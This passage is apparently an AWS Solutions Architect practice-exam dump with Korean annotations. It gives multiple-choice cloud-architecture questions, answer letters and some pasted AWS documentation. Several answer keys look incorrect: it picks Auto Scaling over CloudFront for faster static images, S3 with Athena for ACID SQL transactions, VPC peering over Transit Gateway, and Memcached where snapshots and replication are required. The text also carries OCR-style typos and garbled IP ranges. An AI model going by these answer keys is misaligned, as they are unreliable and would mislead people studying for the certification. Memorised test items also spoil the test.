to run both applications simultaneously. Create an Amazon Elastic Block Store (Amazon EBS) volume with Provisioned IOPS to store the data. D. Configure two Amazon EC2 instances to run both applications. Configure Amazon Elastic File System (Amazon EFS) with General Purpose performance mode and Bursting Throughput mode to store the data. \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A media streaming company collects real-time data and stores it in a disk-optimized database system The company is not getting the expected throughput and wants an in-memory database storage solution that performs faster and provides high availability using data replication. Which database should a solutions architect recommend'?\nA. Amazon RDS for MySQL B. Amazon RDS for PostgreSQL C. Amazon ElastiCache for Redis D. Amazon ElastiCache for Memcached \r문제 풀이\r...\r\rAnswer: C Explanation https://aws.amazon.com/elasticache/redis-vs-memcached/ In-memory databases on AWS Amazon Elasticache for Redis Amazon ElastiCache for Redis is a blazing fast in-memory data store that provides submillisecond latency to power internet-scale, real-time applications. Developers can use ElastiCache for Redis as an in-memory nonrelational database. The ElastiCache for Redis cluster configuration supports up to 15 shards and enables customers to run Redis workloads with up to 6.1 TB of in-memory capacity in a single cluster. ElastiCache for Redis also provides the ability to add and remove shards from a running cluster. You can dynamically scale out and even scale in your Redis cluster workloads to adapt to changes in demand https://aws.amazon.com/nosql/in-memory/\r\r\r\r   QUESTION A company has a custom application running on an Amazon EC2 instance that:\n Reads a large amount of data from Amazon S3 Performs a multi stage analysis Writes the results to Amazon DynamoDB The application writes a significant number of large temporary files during the multi stage analysis The process performance depends on the temporary storage performance. What would be the fastest storage option for holding the temporary files?  A. Multiple Amazon S3 buckets with Transfer Acceleration for storage B. Multiple Amazon EBS drives with Provisioned IOPS and EBS optimization C. Multiple Amazon EFS volumes using the Network I lie System version 4.1 (NFSv4.1) protocol. D. Multiple instance store volumes with software RAID 0. \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company is designing a web application using AWS that processes insurance quotes Users will request quotes from the application Quotes must be separated by quote type must be responded to within 24 hours, and must not be lost The solution should be simple to set up and maintain. Which solution meets these requirements?\nA. Create multiple Amazon Kinesis data streams based on the quote type Configure the web application to send messages to the proper data stream Configure each backend group of application servers to pool messages from its own data stream using the Kinesis Client Library (KCL) B. Create multiple Amazon Simple Notification Service {Amazon SNS) topics and register Amazon SQS queues to their own SNS topic based on the quote type. Configure the web application to publish messages to the SNS topic queue Configure each backend application server to work its own SQS queue C. Create a single Amazon Simple Notification Service {Amazon SNS) topic and subscribe the Amazon SQS queues to the SNS topic Configure SNS message filtering to publish messages to the proper SQS queue based on the quote type. Configure each backend application server to work its own SQS queue. D. Create multiple Amazon Kinesis Data Firehose delivery streams based on the quote type to deliver data streams to an Amazon Elasticsearch Service {Amazon ES) cluster. Configure the web application to send messages to the proper delivery stream Configure each backend group of application servers to search for the messages from Amazon ES and process them accordingly \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION 101-200      QUESTION A company has an API-based inventory reporting application running on Amazon EC2 instances The application stores information in an Amazon DynamoDB table The company\u0026rsquo;s distribution centers have an on-premises shipping application that calls an API to update the inventory before printing shipping labels The company has been experiencing application interruptions several times each day, resulting in lost transactions What should a solutions architect recommend to improve application resiliency?\nA. Modify the shipping application to write to a local database B. Modify the application APIs to run serverless using AWS Lambda C. Configure Amazon API Gateway to call the EC2 inventory application APIs. D. Modify the application to send inventory updates using Amazon Simple Queue Service (Amazon SQS) \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION Company is designing a website that uses an Amazon S3 bucket to store static images. The company wants ail future requests have taster response times while reducing both latency and cost. Which service configuration should a solutions architect recommend?\nA. Deploy a NAT server in front of Amazon S3. B. Deploy Amazon CloudFront in front of Amazon S3. C. Deploy a Network Load Balancer in front of Amazon S3. D. Configure Auto Scaling to automatically adjust the capacity of the website. \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A web application runs on Amazon EC2 instances behind an Application Load Balancer. The application allows users to create custom reports of historical weather data. Generating a report can take up to 5 minutes. These long-running requests use many of the available incoming connections, making the system unresponsive to other users. How can a solutions architect make the system more responsive?\nA. Use Amazon SQS with AWS Lambda to generate reports. B. Increase the idle timeout on the Application Load Balancer to 5 minutes. C. Update the client-side application code to increase its request timeout to 5 minutes. D. Publish the reports to Amazon S3 and use Amazon CloudFront for downloading to the user. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A monolithic application was recently migrated to AWS and is now running on a single Amazon EC2 instance. Due to application limitations, it is not possible to use automatic scaling to scale out the application. The chief technology officer (CTO) wants an automated solution to restore the EC2 instance in the unlikely event the underlying hardware fails. What would allow for automatic recovery of the EC2 instance as quickly as possible?\nA. Configure an Amazon CloudWatch alarm that triggers the recovery of the EC2 instance if it becomes impaired. B. Configure an Amazon CloudWatch alarm to trigger an SNS message that alerts the CTO when the EC2 instance is impaired. C. Configure AWS CloudTrail to monitor the health of the EC2 instance, and if it becomes impaired, triggered instance recovery. D. Configure an Amazon EventBridge event to trigger an AWS Lambda function once an hour that checks the health of the EC2 instance and triggers instance recovery if the EC2 instance is unhealthy. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A website runs a web application that receives a burst of traffic each day at noon. The users upload new pictures and content daily, but have been complaining of timeouts. The architecture uses Amazon EC2 Auto Scaling groups, and the custom application consistently takes 1 minute to initiate upon boot up before responding to user requests. How should a solutions architect redesign the architecture to better respond to changing traffic?\nA. Configure a Network Load Balancer with a slow start configuration. B. Configure AWS ElastiCache for Redis to offload direct requests to the servers. C. Configure an Auto Scaling step scaling policy with an instance warmup condition. D. Configure Amazon CloudFront to use an Application Load Balancer as the origin. \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company has three VPCs named Development, Testing and Production in the us-east-1 Region. The three VPCs need to be connected to an on-premises data center and are designed to be separate to maintain security and prevent any resource sharing A solutions architect needs to find a scalable and secure solution What should the solutions architect recommend?\nA. Create an AWS Direct Connect connection and a VPN connection for each VPC to connect back to the data center. B. Create VPC peers from all the VPCs to the Production VPC Use an AWS Direct Connect connection from the Production VPC back to the data center C. Connect VPN connections from all the VPCs to a VPN in the Production VPC. Use a VPN connection from the Production VPC back to the data center D. Create a new VPC called Network Within the Network VPC create an AWS Transit Gateway with an AWS Direct Connect connection back to the data center Attach all the other VPCs to the Network VPC. \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A solutions architect is designing the cloud architecture for a new application being deployed on AWS The process should run in parallel while adding and removing application nodes as needed based on the number of jobs to be processed The processor application is stateless The solutions architect must ensure that the application is loosely coupled and the job items are durably stored Which design should the solutions architect use?\nA. Create an Amazon SNS topic to send the jobs that need to be processed Create an Amazon Machine Image (AMI) that consists of the processor application Create a launch configuration that uses the AMI Create an Auto Scaling group using the launch configuration Set the scaling policy for the Auto Scaling group to add and remove nodes based on CPU usage B. Create an Amazon SQS queue to hold the jobs that need to be processed Create an Amazon Machine Image (AMI) that consists of the processor application Create a launch configuration that uses the AMI Create an Auto Scaling group using the launch configuration Set the scaling policy for the Auto Scaling group to add and remove nodes based on network usage C. Create an Amazon SQS queue to hold the jobs that needs to be processed Create an Amazon Machine Image (AMI) that consists of the processor application Create a launch template that uses the AMI Create an Auto Scaling group using the launch template Set the scaling policy for the Auto Scaling group to add and remove nodes based on the number of items in the SQS queue D. Create an Amazon SNS topic to send the jobs that need to be processed Create an Amazon Machine Image (AMI) that consists of the processor application Create a launch template that uses the AMI Create an Auto Scaling group using the launch template Set the scaling policy for the Auto Scaling group to add and remove nodes based on the number of messages published to the SNS topic. \r문제 풀이\r...\r\rAnswer: C Explanation Amazon Simple Queue Service Amazon Simple Queue Service (SQS) is a fully managed message queuing service that enables you to decouple and scale microservices, distributed systems, and serverless applications. SQS eliminates the complexity and overhead associated with managing and operating message oriented middleware, and empowers developers to focus on differentiating work. Using SQS, you can send, store, and receive messages between software components at any volume, without losing messages or requiring other services to be available. Get started with SQS in minutes using the AWS console, Command Line Interface or SDK of your choice, and three simple commands. SQS offers two types of message queues. Standard queues offer maximum throughput, best-effort ordering, and at-least-once delivery. SQS FIFO queues are designed to guarantee that messages are processed exactly once, in the exact order that they are sent. Scaling Based on Amazon SQS There are some scenarios where you might think about scaling in response to activity in an Amazon SQS queue. For example, suppose that you have a web app that lets users upload images and use them online. In this scenario, each image requires resizing and encoding before it can be published. The app runs on EC2 instances in an Auto Scaling group, and it\u0026rsquo;s configured to handle your typical upload rates. Unhealthy instances are terminated and replaced to maintain current instance levels at all times. The app places the raw bitmap data of the images in an SQS queue for processing. It processes the images and then publishes the processed images where they can be viewed by users. The architecture for this scenario works well if the number of image uploads doesn\u0026rsquo;t vary over time. But if the number of uploads changes over time, you might consider using dynamic scaling to scale the capacity of your Auto Scaling group. https://aws.amazon.com/sqs/#:~:text=Amazon%20SQS%20leverages%20the%20AWS,queues%20pro vide%20n https://docs.aws.amazon.com/autoscaling/ec2/userguide/as-using-sqs-queue.html\r\r\r\r   QUESTION A company allows its developers to attach existing IAM policies to existing IAM roles to enable (aster experimentation and agility However the security operations team is concerned that the developers could attach the existing administrator policy, which would allow the developers to circumvent any other security policies How should a solutions architect address this issue?\nA. Create an Amazon SNS topic to send an alert every time a developer creates a new policy B. Use service control policies to disable IAM activity across all accounts in the organizational unit C. Prevent the developers from attaching any policies and assign all IAM duties to the security operations team D. Set an IAM permissions boundary on the developer IAM role that explicitly denies attaching the administrator policy \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company hosts a static website on-premises and wants to migrate the website to AWS The website should load as quickly as possible for users around the world The company also wants the most cost-effective solution What should a solutions architect do to accomplish this?\nA. Copy the website content to an Amazon S3 bucket Configure the bucket to serve static webpage content Replicate the S3 bucket to multiple AWS Regions B. Copy the website content to an Amazon S3 bucket Configure the bucket to serve static webpage content Configure Amazon CloudFront with the S3 bucket as the origin C. Copy the website content to an Amazon EBS-backed Amazon EC2 instance running Apache HTTP Server Configure Amazon Route 53 geolocation routing policies to select the closest origin D. Copy the website content to multiple Amazon EBS-backed Amazon EC2 instances running Apache HTTP Server in multiple AWS Regions Configure Amazon CloudFront geolocation routing policies to select the closest origin \r문제 풀이\r...\r\rAnswer: B Explanation What Is Amazon CloudFront?\nAmazon CloudFront is a web service that speeds up distribution of your static and dynamic web content, such as .html, .css, .js, and image files, to your users. CloudFront delivers your content through a worldwide network of data centers called edge locations. When a user requests content that you\u0026rsquo;re serving with CloudFront, the user is routed to the edge location that provides the lowest latency (time delay), so that content is delivered with the best possible performance Using Amazon S3 Buckets for Your Origin When you use Amazon S3 as an origin for your distribution, you place any objects that you want CloudFront to deliver in an Amazon S3 bucket. You can use any method that is supported by Amazon S3 to get your objects into Amazon S3, for example, the Amazon S3 console or API, or a third-party tool. You can create a hierarchy in your bucket to store the objects, just as you would with any other Amazon S3 bucket. Using an existing Amazon S3 bucket as your CloudFront origin server doesn\u0026rsquo;t change the bucket in any way; you can still use it as you normally would to store and access Amazon S3 objects at the standard Amazon S3 price. You incur regular Amazon S3 charges for storing the objects in the bucket. https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/Introduction.html https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/DownloadDistS3AndCusto mOrigins.h\n\r\r\r   QUESTION A company is developing a mobile game that streams score updates to a backend processor and then posts results on a leaderboard. A solutions architect needs to design a solution that can handle large traffic spikes, process the mobile game updates in order of receipt, and store the processed updates in a highly available database. The company also wants to minimize the management overhead required to maintain the solution. What should the solutions architect do to meet these requirements?\nA. Push score updates to Amazon Kinesis Data Streams. Process the updates in Kinesis Data Streams with AWS Lambda. Store the processed updates in Amazon DynamoDB. B. Push score updates to Amazon Kinesis Data Streams. Process the updates with a fleet of Amazon EC2 instances set up for Auto Scaling. Store the processed updates in Amazon Redshifl. C. Push score updates to an Amazon Simple Notification Service (Amazon SNS) topic. Subscribe an AWS Lambda function to the SNS topic to process the updates. Store the processed updates in a SOL database running on Amazon EC2. D. Push score updates to an Amazon Simple Queue Service (Amazon SQS) queue. Use a fleet of Amazon EC2 instances with Auto Scaling to process the updates in the SQS queue. Store the processed updates in an Amazon RDS Multi-AZ DB instance. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A solutions architect has configured the following IAM policy. Which action will be allowed by the policy?\nA. An AWS Lambda function can be deleted from any network. B. An AWS Lambda function can be created from any network. C. An AWS Lambda function can be deleted from the 100.220.0.0/20 network D. An AWS Lambda function can be deleted from the 220 100.16 0 20 network \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company needs to implement a relational database with a multi-Region disaster recovery Recovery Point Objective (RPO) of 1 second and an Recovery Time Objective (RTO) of 1 minute. Which AWS solution can achieve this?\nA. Amazon Aurora Global Database B. Amazon DynamoDB global tables. C. Amazon RDS for MySQL with Multi-AZ enabled. D. Amazon RDS for MySQL with a cross-Region snapshot copy. \r문제 풀이\r...\r\rAnswer: A  RPO 1초, RTO 1분의 특징을 가지는 데이터베이스 유형은 Aurora입니다.  \r\r\r   QUESTION A company is building a document storage application on AWS. The Application runs on Amazon EC2 instances in multiple Availability Zones. The company requires the document store to be highly available. The documents need to be returned immediately when requested. The lead engineer has configured the application to use Amazon Elastic Block Store (Amazon EBS) to store the documents, but is willing to consider other options to meet the availability requirement. What should a solution architect recommend?\nA. Snapshot the EBS volumes regularly and build new volumes using those snapshots in additional Availability Zones. B. Use Amazon EBS for the EC2 instance root volumes. Configure the application to build the document store on Amazon S3. C. Use Amazon EBS for the EC2 instance root volumes. Configure the application to build the document store on Amazon S3 Glacier. D. Use at least three Provisioned IOPS EBS volumes for EC2 instances. Mount the volumes to the EC2 instances in RAID 5 configuration. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A solutions architect is designing a high performance computing (HPC) workload on Amazon EC2 The EC2 instances need to communicate to each other frequently and require network performance with low latency and high throughput Which EC2 configuration meets these requirements'?\nA. Launch the EC2 instances in a cluster placement group in one Availability Zone B. Launch the EC2 instances in a spread placement group in one Availability Zone C. Launch the EC2 instances in an Auto Scaling group in two Regions and peer the VPCs D. Launch the EC2 instances in an Auto Scaling group spanning multiple Availability Zones \r문제 풀이\r...\r\rAnswer: A Explanation Placement groups When you launch a new EC2 instance, the EC2 service attempts to place the instance in such a way that all of your instances are spread out across underlying hardware to minimize correlated failures. You can use placement groups to influence the placement of a group of interdependent instances to meet the needs of your workload. Depending on the type of workload. Cluster - packs instances close together inside an Availability Zone. This strategy enables workloads to achieve the low-latency network performance necessary for tightly-coupled node-to-node communication that is typical of HPC applications. https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/placement-groups.html\r\r\r\r   QUESTION A company is using a VPC peering strategy to connect its VPCs in a single Region to allow for cross-communication. A recent increase in account creations and VPCs has made it difficult to maintain the VPC peering strategy, and the company expects to grow to hundreds of VPCs. There are also new requests to create site-to-site VPNs with some of the VPCs. A solutions architect has been tasked with creating a centrally networking setup for multiple accounts, VPNS, and VPNs. Which networking solution meets these requirements?\nA. Configure shared VPCs and VPNs and share to each other B. Configure a hub-and-spoke and route all traffic through VPC peering. C. Configure an AWS Direct Connect between all VPCs and VPNs. D. Configure a transit gateway with AWS Transit Gateway and connected all VPCs and VPNs. \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company\u0026rsquo;s website is used to sell products to the public The site runs on Amazon EC2 instances in an Auto Scaling group behind an Application Load Balancer (ALB) There is also an Amazon CloudFront distribution and AWS WAF is being used to protect against SQL injection attacks The ALB is the origin for the CloudFront distribution A recent review of security logs revealed an external malicious IP that needs to be blocked from accessing the website What should a solutions architect do to protect the application?\nA. Modify the network ACL on the CloudFront distribution to add a deny rule for the malicious IP address B. Modify the configuration of AWS WAF to add an IP match condition to block the malicious IP address C. Modify the network ACL for the EC2 instances in the target groups behind the ALB to deny the malicious IP address D. Modify the security groups for the EC2 instances in the target groups behind the ALB to deny the malicious IP address \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company currently stores symmetric encryption keys in a hardware security module (HSM). A solution architect must design a solution to migrate key management to AWS. The solution should allow for key rotation and support the use of customer provided keys. Where should the key material be stored to meet these requirements?\nA. Amazon S3 B. AWS Secrets Manager C. AWS Systems Manager Parameter store D. AWS Key Management Service (AWS KMS) \r문제 풀이\r...\r\rAnswer: D  HSM이 가능한 서비스는 Key Management Service 입니다.  \r\r\r   QUESTION A company is investigating potential solutions that would collect, process, and store users' service usage data. The business objective is to create an analytics capability that will enable the company to gather operational insights quickly using standard SQL queries. The solution should be highly available and ensure Atomicity, Consistency, Isolation, and Durability (ACID) compliance in the data tier. Which solution should a solutions architect recommend?\nA. Use Amazon DynamoDB transactions B. Create an Amazon Neptune database in a Multi AZ design C. Use a fully managed Amazon RDS for MySQL database in a Multi-AZ design D. Deploy PostgreSQL on an Amazon EC2 instance that uses Amazon EBS Throughput Optimized HDD (st1) storage. \r문제 풀이\r...\r\rAnswer: C  설명은 MySQL의 대한 특징들입니다.  \r\r\r   QUESTION A company serves content to its subscribers across the world using an application running on AWS The application has several Amazon EC2 instances in a private subnet behind an Application Load Balancer (ALB) Due to a recent change in copyright restrictions the chief information officer (CIO) wants to block access for certain countries Which action will meet these requirements?\nA. Modify the ALB security group to deny incoming traffic from blocked countries. B. Modify the security group for EC2 instances to deny incoming traffic from blocked countries. C. Use Amazon CloudFront to serve the application and deny access to blocked countries. D. Use ALB listener rules to return access denied responses to incoming traffic from blocked countries. \r문제 풀이\r...\r\rAnswer: C Explanation https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/georestrictions.html \u0026ldquo;block access for certain countries.\u0026rdquo; You can use geo restriction, also known as geo blocking, to prevent users in specific geographic locations from accessing content that you\u0026rsquo;re distributing through a CloudFront web distribution.\r\r\r\r   QUESTION A company has a web server running on an Amazon EC2 instance in a public subnet with an Elastic IP address The default security group is assigned to the EC2 instance. The default network ACL has been modified to block all traffic. A solutions architect needs to make the web server accessible from everywhere on port 443 Which combination of steps will accomplish this task? (Select TWO.)\nA. Create a security group with a rule to allow TCP port 443 from source 0.0.0.0/0. B. Create a security group with a rule to allow TCP port 443 to destination 0 0 0 0/0. C. Update the network ACL to allow TCP port 443 from source 0.0 0 0/0. D. Update the network ACL to allow inbound/outbound TCP port 443 from source 0.0.0.0/0 and to destination 0.0.0.0/0. E. Update the network ACL to allow inbound TCP port 443 from source 0.0.0 0/0 and outbound TCP port 32768-65535 to destination 0 0 0.0/0 \r문제 풀이\r...\r\rAnswer: A E \r\r\r   QUESTION A company is deploying a web portal. The company wants to ensure that only the web portion of the application is publicly accessible. To accomplish this, the VPC was designed with two public subnets and two private subnets. The application will run on several Amazon EC2 instances in an Auto Scaling group. SSL termination must be offloaded from the EC2 instances. What should a solutions architect do to ensure these requirements are met?\nA. Configure the Network Load Balancer in the public subnets. Configure the Auto Scaling group in the private subnets and associate it with the Application Load Balancer B. Configure the Network Load Balancer in the public subnets. Configure the Auto Scaling group in the public subnets and associate it with the Application Load Balancer C. Configure the Application Load Balancer in the public subnets. Configure the Auto Scaling group in the private subnets and associate it with the Application Load Balancer D. Configure the Application Load Balancer in the private subnets. Configure the Auto Scaling group in the private subnets and associate it with the Application Load Balancer \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company runs an application on a group of Amazon Linux EC2 instances The application writes log files using standard API calls For compliance reasons, all log files must be retained indefinitely and will be analyzed by a reporting tool that must access all files concurrently Which storage service should a solutions architect use to provide the MOST cost-effective solution?\nA. Amazon EBS B. Amazon EFS C. Amazon EC2 instance store D. Amazon S3 \r문제 풀이\r...\r\rAnswer: D Explanation Amazon S3 Requests to Amazon S3 can be authenticated or anonymous. Authenticated access requires credentials that AWS can use to authenticate your requests. When making REST API calls directly from your code, you create a signature using valid credentials and include the signature in your request. Amazon Simple Storage Service (Amazon S3) is an object storage service that offers industryleading scalability, data availability, security, and performance. This means customers of all sizes and industries can use it to store and protect any amount of data for a range of use cases, such as websites, mobile applications, backup and restore, archive, enterprise applications, IoT devices, and big data analytics. Amazon S3 provides easy-to-use management features so you can organize your data and configure finely-tuned access controls to meet your specific business, organizational, and compliance requirements. Amazon S3 is designed for 99.999999999% (11 9\u0026rsquo;s) of durability, and stores data for millions of applications for companies all around the world. https://aws.amazon.com/s3/\r\r\r\r   QUESTION A financial services company has a web application that serves users in the United States and Europe The application consists of a database tier and a web server tier The database tier consists of a MySQL database hosted in us-east-1 Amazon Route 53 geoproximity routing is used to direct traffic to instances in the closest Region A performance review of the system reveals that European users are not receiving the same level of query performance as those in the United States Which changes should be made to the database tier to improve performance?\nA. Migrate the database to Amazon RDS for MySQL Configure Multi-AZ in one of the European Regions B. Migrate the database to Amazon DynamoDB Use DynamoDB global tables to enable replication to additional Regions C. Deploy MySQL instances in each Region Deploy an Application Load Balancer in front of MySQL to reduce the load on the primary instance D. Migrate the database to an Amazon Aurora global database in MySQL compatibility mode Configure read replicas in one of the European Regions \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company is migrating a three-tier application to AWS. The application requires a MySQL database. In the past, the application users reported poor application performance when creating new entries. These performance issues were caused by users generating different real-time reports from the application duringworking hours. Which solution will improve the performance of the application when it is moved to AWS?\nA. Import the data into an Amazon DynamoDB table with provisioned capacity. Refactor the application to use DynamoDB for reports. B. Create the database on a compute optimized Amazon EC2 instance. Ensure compute resources exceed the on-premises database. C. Create an Amazon Aurora MySQL Multi-AZ DB cluster with multiple read replicas. Configure the application reader endpoint for reports. D. Create an Amazon Aurora MySQL Multi-AZ DB cluster. Configure the application to use the backup instance of the cluster as an endpoint for the reports. \r문제 풀이\r...\r\rAnswer: C Explanation Amazon RDS Read Replicas Now Support Multi-AZ Deployments Starting today, Amazon RDS Read Replicas for MySQL and MariaDB now support Multi-AZ deployments. Combining Read Replicas with Multi-AZ enables you to build a resilient disaster recovery strategy and simplify your database engine upgrade process. Amazon RDS Read Replicas enable you to create one or more read-only copies of your database instance within the same AWS Region or in a different AWS Region. Updates made to the source database are then asynchronously copied to your Read Replicas. In addition to providing scalability for read-heavy workloads, Read Replicas can be promoted to become a standalone database instance when needed. Amazon RDS Multi-AZ deployments provide enhanced availability for database instances within a single AWS Region. With Multi-AZ, your data is synchronously replicated to a standby in a different Availability Zone (AZ). In the event of an infrastructure failure, Amazon RDS performs an automatic failover to the standby, minimizing disruption to your applications. You can now use Read Replicas with Multi-AZ as part of a disaster recovery (DR) strategy for your production databases. A well-designed and tested DR plan is critical for maintaining business continuity after a disaster. A Read Replica in a different region than the source database can be used as a standby database and promoted to become the new production database in case of a regional disruption. You can also combine Read Replicas with Multi-AZ for your database engine upgrade process. You can create a Read Replica of your production database instance and upgrade it to a new database engine version. When the upgrade is complete, you can stop applications, promote the Read Replica to a standalone database instance, and switch over your applications. Since the database instance is already a Multi-AZ deployment, no additional steps are needed. Overview of Amazon RDS Read Replicas Deploying one or more read replicas for a given source DB instance might make sense in a variety of scenarios, including the following: Scaling beyond the compute or I/O capacity of a single DB instance for read-heavy database workloads. You can direct this excess read traffic to one or more read replicas. Serving read traffic while the source DB instance is unavailable. In some cases, your source DB instance might not be able to take I/O requests, for example due to I/O suspension for backups or scheduled maintenance. In these cases, you can direct read traffic to your read replicas. For this use case, keep in mind that the data on the read replica might be \u0026ldquo;stale\u0026rdquo; because the source DB instance is unavailable. Business reporting or data warehousing scenarios where you might want business reporting queries to run against a read replica, rather than your primary, production DB instance. Implementing disaster recovery. You can promote a read replica to a standalone instance as a disaster recovery solution if the source DB instance fails. https://aws.amazon.com/about-aws/whats-new/2018/01/amazon-rds-read-replicas-now-supportmulti-az-deploym https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_ReadRepl.html\r\r\r\r   QUESTION An application running on an Amazon EC2 instance in VPC-A needs to access files in another EC2 instance in VPC-B. Both are in separate. AWS accounts. The network administrator needs to design a solution to enable secure access to EC2 instance in VPC-B from VPC-A. The connectivity should not have a single point of failure or bandwidth concerns. Which solution will meet these requirements?\nA. Set up a VPC peering connection between VPC-A and VPC-B. B. Set up VPC gateway endpoints for the EC2 instance running in VPC-B. C. Attach a virtual private gateway to VPC-B and enable routing from VPC-A. D. Create a private virtual interface (VIF) for the EC2 instance running in VPC-B and add appropriate routes from VPC-B. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company wants to replicate its data to AWS to recover in the event of a disaster. Today, a system administrator has scripts that copy data to a NFS share Individual backup files need to be accessed with low latency by application administrators to deal with errors in processing. What should a solutions architect recommend to meet these requirements?\nA. Modify the script to copy data to an Amazon S3 bucket instead of the on-premises NFS share B. Modify the script to copy data to an Amazon S3 Glacier Archive instead of the on-premises NFS share C. Modify the script to copy data to an Amazon Elastic File System (Amazon EFS) volume instead of the on-premises NFS share. D. Modify the script to copy data to an AWS Storage Gateway for File Gateway virtual appliance instead of the on-premises NFS share. \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company is building a payment application that must be highly available even during regional service disruptions A solutions architect must design a data storage solution that can be easily replicated and used in other AWS Regions. The application also requires low-latency atomicity, consistency, isolation, and durability (ACID) transactions that need to be immediately available to generate reports The development team also needs to use SQL. Which data storage solution meets these requirements'?\nA. Amazon Aurora Global Database B. Amazon DynamoDB global tables C. Amazon S3 with cross-Region replication and Amazon Athena D. MySQL on Amazon EC2 instances with Amazon Elastic Block Store Amazon EBS) snapshot replication \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company is deploying a multi-instance application within AWS that requires minimal latency between the instances. What should a solutions architect recommend?\nA. Use an Auto Scaling group with a cluster placement group. B. Use an Auto Scaling group with single Availability Zone in the same AWS Region. C. Use an Auto Scaling group with multiple Availability Zones in the same AWS Region. D. Use a Network Load Balancer with multiple Amazon EC2 Dedicated Hosts as the targets \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company is hosting a website behind multiple Application Load Balancers. The company has different distribution rights for its content around the world. A solutions architect needs to ensure that users are served the correct content without violating distribution rights. Which configuration should the solutions architect choose to meet these requirements?\nA. Configure Amazon CloudFront with AWS WAF. B. Configure Application Load Balancers with AWS WAF. C. Configure Amazon Route 53 with a geolocation policy. D. Configure Amazon Route 53 with a geoproximity routing policy. \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company runs a static website through its on-premises data center. The company has multiple servers mat handle all of its traffic, but on busy days, services are interrupted and the website becomes unavailable. The company wants to expand its presence globally and plans to triple its website traffic. What should a solutions architect recommend to meet these requirements?\nA. Migrate the website content to Amazon S3 and host the website on Amazon CloudFront. B. Migrate the website content to Amazon EC2 instances with public Elastic IP addresses in multiple AWS Regions. C. Migrate the website content to Amazon EC2 instances and vertically scale as the load increases. D. Use Amazon Route 53 to distribute the loads across multiple Amazon CloudFront distributions for each AWS Region that exists globally. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A solution architect has created two IAM policies: Policy1 and Policy2. Both policies are attached to an IAM group.\n Policy1  { \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;iam:Get*\u0026#34;, \u0026#34;iam:List*\u0026#34;, \u0026#34;kms:List*\u0026#34;, \u0026#34;ec2:*\u0026#34;, \u0026#34;ds:*\u0026#34;, \u0026#34;logs:Get*\u0026#34;, \u0026#34;logs:Describe*\u0026#34; ], \u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34; } ] }   Policy1  { \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Effect\u0026#34;: \u0026#34;Deny\u0026#34;, \u0026#34;Action\u0026#34;: \u0026#34;ds:Delete\u0026#34;, \u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34; } ] } A cloud engineer is added as an IAM user to the IAM group. Which action will the cloud engineer be able to perform?\nA. Deleting IAM users B. Deleting directories C. Deleting Amazon EC2 instances D. Deleting logs from Amazon CloudWatch Logs \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company wants to optimize the cost of its data storage for data that is accessed quarterly. The company requires high throughput, low latency, and rapid access, when needed Which Amazon S3 storage class should a solutions architect recommend?\nA. Amazon S3 Standard-Infrequent Access (S3 Standard-IA)\nB. Amazon S3 Glacier (S3 Glacier)\nC. Amazon S3 Intelligent-Tiering (S3 Intelligent-Tiering)\nD. Amazon S3 Standard (S3 Standard) \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company has a mobile game that reads most of its metadata from an Amazon RDS DB instance As the game increased in popularity developers noticed slowdowns related to the game\u0026rsquo;s metadata load times Performance metrics indicate that simply scaling the database will not help A solutions architect must explore all options that include capabilities for snapshots replication and sub-millisecond response times What should the solutions architect recommend to solve these issues?\nA. Migrate the database to Amazon Aurora with Aurora Replicas\nB. Migrate the database to Amazon DyramoDB with global tables\nC. Add an Amazon ElastiCache for Redis layer in front of the database.\nD. Add an Amazon ElastiCache for Memcached layer in front of the database \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company\u0026rsquo;s website provides users with downloadable historical performance reports. The website needs a solution that will scale to meet the company\u0026rsquo;s website demands globally. The solution should be cost effective, limit the? provisioning of Into and provide the fastest possible response time. Which combination should a solutions architect recommend to meet these requirements?\nA. Amazon CloudFront and Amazon S3\nB. AWS Lambda and Amazon Dynamo\nC. Application Load Balancer with Amazon EC2 Auto Scaling\nD. Amazon Route 53 with internal Application Load Balances \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company has enabled AWS CloudTrail logs to deliver log files to an Amazon S3 bucket for each of its developer accounts. The company has created a central AWS account for streamlining management and audit reviews. An internal auditor needs to access the CloudTrail logs, yet access needs to be restricted for all developer account users. The solution must be secure and optimized. How should a solutions architect meet these requirements?\nA. Configure an AWS Lambda function in each 